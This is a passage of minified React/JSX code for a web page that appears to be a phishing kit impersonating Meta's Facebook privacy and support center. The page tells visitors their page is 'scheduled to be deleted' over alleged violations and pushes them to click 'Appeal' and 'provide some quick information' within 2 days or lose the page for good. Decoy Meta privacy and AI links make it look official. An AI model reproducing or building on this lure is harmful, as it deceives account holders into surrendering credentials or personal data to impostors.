                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "Other terms and conditions"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow",
                                                                children: (0,
                                                                he.jsxs)("svg", {
                                                                    width: 12,
                                                                    height: 12,
                                                                    viewBox: "0 0 12 12",
                                                                    fill: "none",
                                                                    xmlns: "http://www.w3.org/2000/svg",
                                                                    children: [(0,
                                                                    he.jsx)("path", {
                                                                        d: "M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z",
                                                                        fill: "black"
                                                                    }), (0,
                                                                    he.jsx)("path", {
                                                                        d: "M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z",
                                                                        fill: "black"
                                                                    })]
                                                                })
                                                            })]
                                                        })]
                                                    })]
                                                }), (0,
                                                he.jsxs)("div", {
                                                    className: "item-action",
                                                    children: [(0,
                                                    he.jsxs)("div", {
                                                        className: "action-button",
                                                        children: [(0,
                                                        he.jsx)("div", {
                                                            className: "action-icon",
                                                            children: (0,
                                                            he.jsxs)("svg", {
                                                                width: 12,
                                                                height: 12,
                                                                viewBox: "0 0 12 12",
                                                                fill: "none",
                                                                xmlns: "http://www.w3.org/2000/svg",
                                                                children: [(0,
                                                                he.jsxs)("g", {
                                                                    clipPath: "url(#clip0_4090_999)",
                                                                    children: [(0,
                                                                    he.jsx)("path", {
                                                                        fillRule: "evenodd",
                                                                        clipRule: "evenodd",
                                                                        d: "M8 6C8 6.53043 7.78929 7.03914 7.41421 7.41421C7.03914 7.78929 6.53043 8 6 8C5.46957 8 4.96086 7.78929 4.58579 7.41421C4.21071 7.03914 4 6.53043 4 6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4C6.53043 4 7.03914 4.21071 7.41421 4.58579C7.78929 4.96086 8 5.46957 8 6ZM7 6C7 6.26522 6.89464 6.51957 6.70711 6.70711C6.51957 6.89464 6.26522 7 6 7C5.73478 7 5.48043 6.89464 5.29289 6.70711C5.10536 6.51957 5 6.26522 5 6C5 5.73478 5.10536 5.48043 5.29289 5.29289C5.48043 5.10536 5.73478 5 6 5C6.26522 5 6.51957 5.10536 6.70711 5.29289C6.89464 5.48043 7 5.73478 7 6Z",
                                                                        fill: "black"
                                                                    }), (0,
                                                                    he.jsx)("path", {
                                                                        fillRule: "evenodd",
                                                                        clipRule: "evenodd",
                                                                        d: "M11.0959 4.6035L9.9839 5.6335C10.006 5.87733 10.006 6.12267 9.9839 6.3665L11.0959 7.3965C11.179 7.47347 11.2335 7.57639 11.2505 7.68839C11.2675 7.80039 11.246 7.91484 11.1894 8.013L10.3384 9.487C10.2817 9.58517 10.1933 9.66116 10.0877 9.7025C9.98217 9.74383 9.86569 9.74807 9.7574 9.7145L8.3099 9.2665C8.10995 9.40822 7.89739 9.53123 7.6749 9.634L7.3389 11.111C7.31374 11.2215 7.2518 11.3202 7.16323 11.3908C7.07466 11.4615 6.96471 11.5 6.8514 11.5H5.1504C5.03708 11.5 4.92713 11.4615 4.83856 11.3908C4.74999 11.3202 4.68805 11.2215 4.6629 11.111L4.3269 9.634C4.10442 9.53121 3.89186 9.40819 3.6919 9.2665L2.2444 9.7145C2.13611 9.74807 2.01962 9.74383 1.91406 9.7025C1.80849 9.66116 1.7201 9.58517 1.6634 9.487L0.812396 8.013C0.755836 7.91484 0.734284 7.80039 0.751271 7.68839C0.768258 7.57639 0.822776 7.47347 0.905896 7.3965L2.0179 6.3665C1.99574 6.12267 1.99574 5.87733 2.0179 5.6335L0.905396 4.6035C0.822276 4.52653 0.767758 4.42361 0.750771 4.31161C0.733784 4.19961 0.755336 4.08515 0.811896 3.987L1.6629 2.513C1.7196 2.41483 1.80799 2.33884 1.91356 2.2975C2.01912 2.25617 2.13561 2.25193 2.2439 2.2855L3.6914 2.7335C3.89135 2.59179 4.10391 2.46877 4.3264 2.366L4.6624 0.889C4.68755 0.778515 4.74949 0.67985 4.83806 0.609175C4.92663 0.5385 5.03658 0.500005 5.1499 0.5H6.8514C6.96471 0.500005 7.07466 0.5385 7.16323 0.609175C7.2518 0.67985 7.31374 0.778515 7.3389 0.889L7.6749 2.366C7.89739 2.46876 8.10995 2.59178 8.3099 2.7335L9.7574 2.2855C9.86569 2.25193 9.98217 2.25617 10.0877 2.2975C10.1933 2.33884 10.2817 2.41483 10.3384 2.513L11.1894 3.987C11.246 4.08515 11.2675 4.19961 11.2505 4.31161C11.2335 4.42361 11.179 4.52653 11.0959 4.6035ZM6.8089 3.068L7.2559 3.274C7.4234 3.3515 7.5824 3.444 7.7319 3.5495L8.1344 3.8345L9.6719 3.359L10.1234 4.141L8.9434 5.234L8.9884 5.724C9.0051 5.90762 9.0051 6.09238 8.9884 6.276L8.9434 6.766L10.1234 7.8585L9.6719 8.641L8.1344 8.1655L7.7319 8.4505C7.58199 8.55656 7.42265 8.64861 7.2559 8.7255L6.8089 8.932L6.4524 10.5H5.5489L5.1924 8.932L4.7454 8.726C4.57862 8.64895 4.41928 8.55673 4.2694 8.4505L3.8669 8.1655L2.3294 8.641L1.8774 7.8585L3.0574 6.766L3.0129 6.276C2.99622 6.09238 2.99622 5.90762 3.0129 5.724L3.0579 5.234L1.8779 4.141L2.3294 3.359L3.8669 3.8345L4.2694 3.5495C4.4189 3.4435 4.5779 3.3515 4.7454 3.2745L5.1924 3.068L5.5489 1.5H6.4524L6.8089 3.068Z",
                                                                        fill: "black"
                                                                    })]
                                                                }), (0,
                                                                he.jsx)("defs", {
                                                                    children: (0,
                                                                    he.jsx)("clipPath", {
                                                                        id: "clip0_4090_999",
                                                                        children: (0,
                                                                        he.jsx)("rect", {
                                                                            width: 12,
                                                                            height: 12,
                                                                            fill: "white"
                                                                        })
                                                                    })
                                                                })]
                                                            })
                                                        }), (0,
                                                        he.jsx)("div", {
                                                            className: "action-text",
                                                            children: "Settings"
                                                        }), (0,
                                                        he.jsx)("div", {
                                                            className: "action-arrow",
                                                            children: (0,
                                                            he.jsx)("svg", {
                                                                width: 12,
                                                                height: 12,
                                                                viewBox: "0 0 12 12",
                                                                fill: "none",
                                                                xmlns: "http://www.w3.org/2000/svg",
                                                                children: (0,
                                                                he.jsx)("path", {
                                                                    fillRule: "evenodd",
                                                                    clipRule: "evenodd",
                                                                    d: "M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z",
                                                                    fill: "black"
                                                                })
                                                            })
                                                        })]
                                                    }), (0,
                                                    he.jsxs)("div", {
                                                        className: "content-action",
                                                        children: [(0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "Facebook Settings"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow",
                                                                children: (0,
                                                                he.jsxs)("svg", {
                                                                    width: 12,
                                                                    height: 12,
                                                                    viewBox: "0 0 12 12",
                                                                    fill: "none",
                                                                    xmlns: "http://www.w3.org/2000/svg",
                                                                    children: [(0,
                                                                    he.jsx)("path", {
                                                                        d: "M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z",
                                                                        fill: "black"
                                                                    }), (0,
                                                                    he.jsx)("path", {
                                                                        d: "M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z",
                                                                        fill: "black"
                                                                    })]
                                                                })
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "Instagram Settings"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow",
                                                                children: (0,
                                                                he.jsxs)("svg", {
                                                                    width: 12,
                                                                    height: 12,
                                                                    viewBox: "0 0 12 12",
                                                                    fill: "none",
                                                                    xmlns: "http://www.w3.org/2000/svg",
                                                                    children: [(0,
                                                                    he.jsx)("path", {
                                                                        d: "M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z",
                                                                        fill: "black"
                                                                    }), (0,
                                                                    he.jsx)("path", {
                                                                        d: "M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z",
                                                                        fill: "black"
                                                                    })]
                                                                })
                                                            })]
                                                        })]
                                                    })]
                                                })]
                                            })]
                                        })
                                    }), (0,
                                    he.jsx)("div", {
                                        className: "right col-8",
                                        children: (0,
                                        he.jsxs)("div", {
                                            className: "content-right",
                                            children: [(0,
                                            he.jsxs)("h1", {
                                                children: [(0,
                                                he.jsxs)("svg", {
                                                    width: 37,
                                                    height: 37,
                                                    viewBox: "0 0 100 100",
                                                    fill: "none",
                                                    xmlns: "http://www.w3.org/2000/svg",
                                                    children: [(0,
                                                    he.jsx)("rect", {
                                                        width: 100,
                                                        height: 100,
                                                        rx: 50,
                                                        fill: "#D80100"
                                                    }), (0,
                                                    he.jsx)("rect", {
                                                        width: 74,
                                                        height: 13,
                                                        transform: "translate(13 43)",
                                                        fill: "white"
                                                    })]
                                                }), "We have scheduled your page to be deleted"]
                                            }), (0,
                                            he.jsx)("p", {
                                                children: "We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification."
                                            }), (0,
                                            he.jsx)("br", {}), (0,
                                            he.jsx)("p", {
                                                children: "If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information"
                                            }), (0,
                                            he.jsxs)("div", {
                                                className: "card-thumb",
                                                children: [(0,
                                                he.jsx)("img", {
                                                    src: "test.png", width: "100%",
                                                    alt: ""
                                                }), (0,
                                                he.jsxs)("div", {
                                                    className: "thumb-content",
                                                    children: [(0,
                                                    he.jsx)("p", {
                                                        className: "thumb-type",
                                                        children: "Appeal request"
                                                    }), (0,
                                                    he.jsx)("h4", {
                                                        children: "Fixing problems with your page"
                                                    }), (0,
                                                    he.jsx)("p", {
                                                        children: "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal."
                                                    }), (0,
                                                    he.jsx)("div", {
                                                        className: "btn-wrapper",
                                                        children: (0,
                                                        he.jsx)("button", {
                                                            onClick: () => t(!0),
                                                            className: "button fb-blue",
                                                            children: "Appeal"
                                                        })
                                                    })]
                                                })]
                                            }), (0,
                                            he.jsx)("br", {}), (0,
                                            he.jsx)("h6", {
                                                children: "Appeal Guide"
                                            }), (0,
                                            he.jsxs)("ul", {
                                                children: [(0,
                                                he.jsx)("li", {
                                                    children: "In your appeal,Please ensure that all necessary information is included in your request so that it can be processed promptly. If you provide incorrect information or fail to respond to requests for additional information within 2 days, your appeal may be closed without further review. and your page will be deleted for permanently"
                                                }), (0,
                                                he.jsx)("li", {
                                                    children: "After your submission, we will review your appeal and cancel the page deletion if the information you provide is correct. The review process typically takes 24 hours, though in some cases it may take longer."
                                                })]
                                            }), (0,
                                            he.jsx)("br", {}), (0,
                                            he.jsx)("br", {}), (0,
                                            he.jsx)("h6", {
                                                children: "Privacy Center"
                                            }), (0,
                                            he.jsxs)("div", {
                                                className: "action-button-list",
                                                children: [(0,
                                                he.jsxs)("div", {
                                                    className: "action-button b-bottom",
                                                    children: [(0,
                                                    he.jsx)("div", {
                                                        className: "action-icon",
                                                        children: (0,
                                                        he.jsx)("img", {
                                                            src: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120"><rect fill-opacity="0"/></svg>',
                                                            alt: "",
                                                            style: {
                                                                backgroundBlendMode: "normal!important",
                                                                backgroundClip: "content-box!important",
                                                                backgroundPosition: "50% 50%!important",
                                                                backgroundColor: "rgba(0,0,0,0)!important",
                                                                backgroundImage: "var(--sf-img-2)!important",
                                                                backgroundSize: "100% 100%!important",
                                                                backgroundOrigin: "content-box!important",
                                                                backgroundRepeat: "no-repeat!important"
                                                            }
                                                        })
                                                    }), (0,
                                                    he.jsxs)("div", {
                                                        className: "action-text",
                                                        children: [(0,
                                                        he.jsx)("span", {
                                                            children: "What is the Privacy Policy and what does it say?"
                                                        }), (0,
                                                        he.jsx)("br", {}), (0,
                                                        he.jsx)("span", {
                                                            className: "small-grey",
                                                            children: "Privacy Policy"
                                                        })]
                                                    }), (0,
                                                    he.jsx)("div", {
                                                        className: "action-arrow",
                                                        children: (0,
                                                        he.jsx)("svg", {
                                                            width: 12,
                                                            height: 12,
                                                            viewBox: "0 0 12 12",
                                                            fill: "none",
                                                            xmlns: "http://www.w3.org/2000/svg",
                                                            children: (0,
                                                            he.jsx)("path", {
                                                                fillRule: "evenodd",
                                                                clipRule: "evenodd",
                                                                d: "M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z",
                                                                fill: "black"
                                                            })
                                                        })
                                                    })]
                                                }), (0,
                                                he.jsxs)("div", {
                                                    className: "action-button",
                                                    children: [(0,
                                                    he.jsx)("div", {
                                                        className: "action-icon",
                                                        children: (0,
                                                        he.jsx)("img", {
                                                            src: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120"><rect fill-opacity="0"/></svg>',
                                                            alt: "",
                                                            style: {
                                                                backgroundBlendMode: "normal!important",
                                                                backgroundClip: "content-box!important",
                                                                backgroundPosition: "50% 50%!important",
                                                                backgroundColor: "rgba(0,0,0,0)!important",
                                                                backgroundImage: "var(--sf-img-2)!important",
                                                                backgroundSize: "100% 100%!important",
                                                                backgroundOrigin: "content-box!important",
                                                                backgroundRepeat: "no-repeat!important"
                                                            }
                                                        })
                                                    }), (0,
                                                    he.jsxs)("div", {
                                                        className: "action-text",
                                                        children: [(0,
                                                        he.jsx)("span", {
                                                            children: "How you can manage or delete your information"
                                                        }), (0,
                                                        he.jsx)("br", {}), (0,
                                                        he.jsx)("span", {
                                                            className: "small-grey",
                                                            children: "Privacy Policy"
                                                        })]
                                                    }), (0,
                                                    he.jsx)("div", {
                                                        className: "action-arrow",
                                                        children: (0,
                                                        he.jsx)("svg", {
                                                            width: 12,
                                                            height: 12,
                                                            viewBox: "0 0 12 12",
                                                            fill: "none",
                                                            xmlns: "http://www.w3.org/2000/svg",
                                                            children: (0,
                                                            he.jsx)("path", {
                                                                fillRule: "evenodd",
                                                                clipRule: "evenodd",
                                                                d: "M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z",
                                                                fill: "black"
                                                            })
                                                        })
                                                    })]
                                                })]
                                            }), (0,
                                            he.jsx)("br", {}), (0,
                                            he.jsx)("h6", {
                                                children: "For more details, see the User Agreement"
                                            }), (0,
                                            he.jsx)("div", {
                                                className: "action-button-list",
                                                children: (0,
                                                he.jsxs)("div", {
                                                    className: "action-button",
                                                    children: [(0,
                                                    he.jsx)("div", {
                                                        className: "action-icon",
                                                        children: (0,
                                                        he.jsx)("img", {
                                                            src: "test.png",
alt: ""
                                                        })
                                                    }), (0,
                                                    he.jsxs)("div", {
                                                        className: "action-text",
                                                        children: [(0,
                                                        he.jsx)("span", {
                                                            children: "Meta AI"
                                                        }), (0,
                                                        he.jsx)("br", {}), (0,
                                                        he.jsx)("span", {
                                                            className: "small-grey",
                                                            children: "User Agreement"
                                                        })]
                                                    }), (0,
                                                    he.jsx)("div", {
                                                        className: "action-arrow",
                                                        children: (0,
                                                        he.jsx)("svg", {
                                                            width: 12,
                                                            height: 12,
                                                            viewBox: "0 0 12 12",
                                                            fill: "none",
                                                            xmlns: "http://www.w3.org/2000/svg",
                                                            children: (0,
                                                            he.jsx)("path", {
                                                                fillRule: "evenodd",
                                                                clipRule: "evenodd",
                                                                d: "M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z",
                                                                fill: "black"
                                                            })
                                                        })
                                                    })]
                                                })
                                            }), (0,
                                            he.jsx)("br", {}), (0,
                                            he.jsx)("h6", {
                                                children: "Additional resources"
                                            }), (0,
                                            he.jsxs)("div", {
                                                className: "action-button-list",
                                                children: [(0,
                                                he.jsxs)("div", {
                                                    className: "action-button b-bottom",
                                                    children: [(0,
                                                    he.jsxs)("div", {
                                                        className: "action-text",
                                                        children: [(0,
                                                        he.jsx)("span", {
                                                            children: "How Meta uses information for generative AI models"
                                                        }), (0,
                                                        he.jsx)("br", {}), (0,
                                                        he.jsx)("span", {
                                                            className: "small-grey",
                                                            children: "Privacy Center"
                                                        })]
                                                    }), (0,
                                                    he.jsx)("div", {
                                                        className: "action-arrow",
                                                        children: (0,
                                                        he.jsx)("svg", {
                                                            width: 12,
                                                            height: 12,
                                                            viewBox: "0 0 12 12",
                                                            fill: "none",
                                                            xmlns: "http://www.w3.org/2000/svg",
                                                            children: (0,
                                                            he.jsx)("path", {
                                                                fillRule: "evenodd",
                                                                clipRule: "evenodd",
                                                                d: "M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z",
                                                                fill: "black"
                                                            })
                                                        })
                                                    })]
                                                }), (0,
                                                he.jsxs)("div", {
                                                    className: "action-button b-bottom",
                                                    children: [(0,
                                                    he.jsxs)("div", {
                                                        className: "action-text",
                                                        children: [(0,
                                                        he.jsx)("span", {
                                                            children: "Cards with information about the operation of AI systems"
                                                        }), (0,
                                                        he.jsx)("br", {}), (0,
                                                        he.jsx)("span", {
                                                            className: "small-grey",
                                                            children: "Meta AI website"
                                                        })]
                                                    }), (0,
                                                    he.jsx)("div", {
                                                        className: "action-arrow",
                                                        children: (0,
                                                        he.jsx)("svg", {
                                                            width: 12,
                                                            height: 12,
                                                            viewBox: "0 0 12 12",
                                                            fill: "none",
                                                            xmlns: "http://www.w3.org/2000/svg",
                                                            children: (0,
                                                            he.jsx)("path", {
                                                                fillRule: "evenodd",
                                                                clipRule: "evenodd",
                                                                d: "M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z",
                                                                fill: "black"
                                                            })
                                                        })
                                                    })]
                                                }), (0,
                                                he.jsxs)("div", {
                                                    className: "action-button",
                                                    children: [(0,
                                                    he.jsxs)("div", {
                                                        className: "action-text",
                                                        children: [(0,
                                                        he.jsx)("span", {
                                                            children: "Introduction to Generative AI"
                                                        }), (0,
                                                        he.jsx)("br", {}), (0,
                                                        he.jsx)("span", {
                                                            className: "small-grey",
                                                            children: "For teenagers"
                                                        })]
                                                    }), (0,
                                                    he.jsx)("div", {
                                                        className: "action-arrow",
                                                        children: (0,
                                                        he.jsx)("svg", {
                                                            width: 12,
                                                            height: 12,
                                                            viewBox: "0 0 12 12",
                                                            fill: "none",
                                                            xmlns: "http://www.w3.org/2000/svg",
                                                            children: (0,
                                                            he.jsx)("path", {
                                                                fillRule: "evenodd",
                                                                clipRule: "evenodd",
